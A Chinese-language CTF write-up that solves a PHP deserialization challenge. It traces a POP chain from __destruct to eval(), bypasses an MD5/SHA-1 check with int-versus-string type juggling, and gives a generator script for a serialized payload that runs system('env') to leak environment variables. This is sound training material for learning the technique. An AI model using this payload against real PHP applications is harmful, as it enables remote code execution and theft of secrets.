# Rubbish_Unser

## 题目简述

页面把 GET 参数 `0xGame` 直接传给 `unserialize()`，源码中存在五个可串联的 PHP 魔术方法。反序列化后程序立即抛出未捕获异常；请求结束释放对象时仍会触发 `ZZZ::__destruct()`，从而启动 POP 链。最终危险点是 `HSR::__get()` 中的 `eval($this->robin)`。

容器没有把 flag 写入普通文件，而是通过 Dockerfile 的 `ENV flag=...` 放入环境变量，因此利用链末端执行 `system('env')` 即可读取。

## 解题过程

### 还原 POP 链

各魔术方法之间的触发关系为：

```text
ZZZ::__destruct
  └─ 字符串拼接 $yuzuha -> Mi::__toString
       └─ 调用不存在的 tks() -> GI::__call
            └─ 调用 $furina() -> HI3rd::__invoke
                 └─ 访问不存在的 Elysia -> HSR::__get
                      └─ eval($robin)
```

决定链条的关键源码如下：

```php
class ZZZ {
    public $yuzuha;
    function __destruct() {
        echo "破绽，在这里！" . $this->yuzuha;
    }
}

class Mi {
    public $game;
    function __toString() {
        return @$this->game->tks();
    }
}

class GI {
    public $furina;
    function __call($name, $args) {
        $callable = $this->furina;
        return $callable();
    }
}

class HI3rd {
    public $RaidenMei;
    public $kiana;
    public $guanxing;
    function __invoke() {
        if ($this->kiana !== $this->RaidenMei
            && md5($this->kiana) === md5($this->RaidenMei)
            && sha1($this->kiana) === sha1($this->RaidenMei)) {
            return $this->guanxing->Elysia;
        }
    }
}

class HSR {
    public $robin;
    function __get($name) {
        eval($this->robin);
    }
}
```

### 绕过双哈希条件

`HI3rd::__invoke()` 要求两个原值严格不等，但它们的 MD5 和 SHA-1 结果都严格相等。令一边为整数 `1`、另一边为字符串 `'1'`：

- `1 !== '1'` 为真，因为类型不同；
- 哈希函数会把二者转换为相同字符串，所以 MD5 与 SHA-1 分别相同。

这不是寻找真正的 MD5/SHA-1 碰撞，而是利用 PHP 的类型转换。

### 构造对象图

本地定义相同类名和公有属性即可生成序列化数据，魔术方法不必在生成端重复实现：

```php
<?php
class ZZZ { public $yuzuha; }
class HSR { public $robin; }
class HI3rd {
    public $RaidenMei = '1';
    public $kiana = 1;
    public $guanxing;
}
class GI { public $furina; }
class Mi { public $game; }

$hsr = new HSR();
$hsr->robin = "system('env');";

$hi3 = new HI3rd();
$hi3->guanxing = $hsr;

$gi = new GI();
$gi->furina = $hi3;

$mi = new Mi();
$mi->game = $gi;

$zzz = new ZZZ();
$zzz->yuzuha = $mi;

echo urlencode(serialize([$zzz, 0]));
```

把输出作为 `0xGame` 参数提交。对象在请求结束时进入析构链，`eval()` 执行 `system('env')`，响应中即可看到 `flag` 环境变量。保留生成脚本比保存一长串 URL 编码结果更可靠，也便于修改末端命令。

## 方法总结

- 核心技巧：按 PHP 魔术方法触发条件构造 POP 对象图，并用类型差异绕过双哈希判断。
- 识别信号：用户数据直接进入 `unserialize()`、析构/转字符串/不可访问方法与属性链最终到达 `eval()`。
- 复用要点：逐节点写清“什么操作触发下一个魔术方法”；哈希条件先检查类型转换，不要直接假设需要密码学碰撞；利用末端应匹配 flag 的真实存储位置。
